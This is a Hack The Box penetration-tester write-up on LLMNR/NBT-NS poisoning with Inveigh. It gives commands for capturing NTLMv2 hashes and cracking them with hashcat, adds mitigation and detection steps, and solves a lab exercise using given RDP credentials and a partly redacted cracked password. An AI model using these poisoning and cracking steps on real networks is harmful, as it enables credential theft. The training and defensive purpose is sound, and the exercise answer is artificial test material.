### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: LLMNR/NBT-NS Poisoning: from Windows <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### LLMNR/NBT-NS Poisoning: from Windows

`Inveigh` = Responder for Windows. PowerShell version is legacy; `InveighZero` is the maintained C# port. Both live in `C:\Tools` on the lab Windows host.

Inveigh listens on LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP/S, SMB, LDAP, WebDAV, Proxy Auth.

PowerShell version: start with file output + LLMNR/NBNS spoofing:

```diff
+ PS> Import-Module .\Inveigh.ps1
+ PS> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

<br>

C# version: defaults are sane:

```diff
+ PS> .\Inveigh.exe
```

<br>

Press `ESC` for interactive console. Useful commands:

```diff
+ > GET CONSOLE
+ > GET NTLMV2
+ > GET NTLMV2UNIQUE
+ > GET NTLMV2USERNAMES
+ > GET CLEARTEXT
+ > STOP
```

<br>

Captured hashes go to `Inveigh-NTLMv2.txt` / `Inveigh-NTLMv2Users.txt` in the working dir. Feed to hashcat -m 5600.

Mitigation (MITRE T1557.001):
- Disable LLMNR via GPO: `Computer Config → Admin Templates → Network → DNS Client → Turn OFF Multicast Name Resolution`.
- Disable NBT-NS via local NIC or PowerShell startup script under GPO:

```diff
+ $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+ Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
```

<br>

Detection: monitor UDP 5355 + 137, inject false LLMNR/NBNS broadcasts and alert on responses, watch event IDs 4697 / 7045, and registry `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast`.

<br>

---

<br>

### Inveigh Exercise

IP: 10.129.138.135

RDP `htb-student:Academy_student_AD!`.

---

### Question 1:
Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.

#### RDP in, run Inveigh.exe from C:\Tools, wait for svc_qualys hash to drop into Inveigh-NTLMv2.txt.

```diff
+ $ xfreerdp /v:10.129.138.135 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
+ PS> cd c:\Tools
+ PS> .\Inveigh.exe
```

<br>

Pull the svc_qualys hash from `Inveigh-NTLMv2.txt`, ship it to the cracking rig, then hashcat:

```diff
+ $ hashcat -m 5600 -a 0 svc_qualys.hash rockyou.txt
+ $ cat ~/.local/share/hashcat/hashcat.potfile
```

	SVC_QUALYS: INLANEFREIGHT:9babbb69edd48622:...:security#1

&#x1F6A9; found **secur--edit--#1**.
